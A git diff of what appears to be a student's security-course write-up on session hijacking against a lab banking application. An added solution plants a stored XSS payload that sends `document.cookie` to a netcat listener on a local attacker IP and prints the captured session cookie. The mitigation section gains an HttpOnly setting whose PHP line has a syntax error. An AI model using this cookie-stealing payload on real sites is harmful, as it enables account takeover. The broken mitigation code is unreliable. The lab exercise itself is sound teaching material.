@@ -316,6 +316,7 @@ In the RFI the attacker uses remote files whereas in LFI local files are used to
 
 __1. Install a webserver on your machine. Use it to write a script that will read the
 information required to hijack a session. Briefly describe your script.__
+
 __Solution:__ 
     - Follow the tutorial to install Nginx
 https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-on-debian-8
@@ -346,6 +347,7 @@ Http.send();
 
 </body>
 </html>
+
 ```
 send the following payload to victim using XSS (Transfer)
 
@@ -361,6 +363,30 @@ send the following payload to victim using XSS (Transfer)
     ```
 - From the logs we can observe the request contents `USECURITYID=v155sm5645ckoddmdpepcubbc4` which we know that , is a cookie value.
 
+
+__Solution 2:__
+
+- We already have apache2 server running on port 80 
+- Run Netcat server with port 81 using command 
+  ``` sudo nc -l -p 81 -v -n````
+- Transfer amount from attacker account to victim account with the below payload as remark
+  ```javascript 
+    <script> new Image().src="http://192.168.59.139:82/cookie.html?c="+document.cookie;</script>
+  ```
+- When victim open the account details page the netcat server gets the cookie:
+  ```sudo nc -l -p 82 -v -n
+     [sudo] password for kakashi: 
+     listening on [any] 82 ...
+     connect to [192.168.59.139] from (UNKNOWN) [192.168.59.139] 34582
+     GET /cookie.html?c=USECURITYID=esl5thgedb8lt2t63pv4jg5v10 HTTP/1.1
+     Host: 192.168.59.139:82
+     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+     Accept: image/webp,*/*
+     Accept-Language: en-US,en;q=0.5
+     Accept-Encoding: gzip, deflate
+     Connection: keep-alive
+     Referer: http://localhost/htdocs/index.php?page=htbdetails&account=184830489    ```
+From the logs we can observe the cookie value that is esl5thgedb8lt2t63pv4jg5v10
 
 
 __2. Use the implementation from the last step to hijack the session of a customer of your bank. Briefly describe the steps to perform this attack.__
@@ -394,12 +420,8 @@ __Solution:__ `https` has no significant influence in this case, as the attacker
 __5. Implement some precautions which can prevent or mitigate this attack?__
 __Solution:__
 1. Sanitize user input to avaoiud any injection into the application.
-2. set `Http Only` flag to avoid cookies being accessed  by client side scripts
-3. use `https` connections
-4. Implement `Same Origin Policy`, as it can prevent sending sending request  other domains.
-
-
-
+2. set `Http Only` flag to true in both index.pho and login.php to avoid cookies being accessed by client side scripts
+```session_set_cookie_params($htbconf['bank/cookievalidity'],,null,null,null,true);```
 
 ### Exercise 5: Session Fixation
 
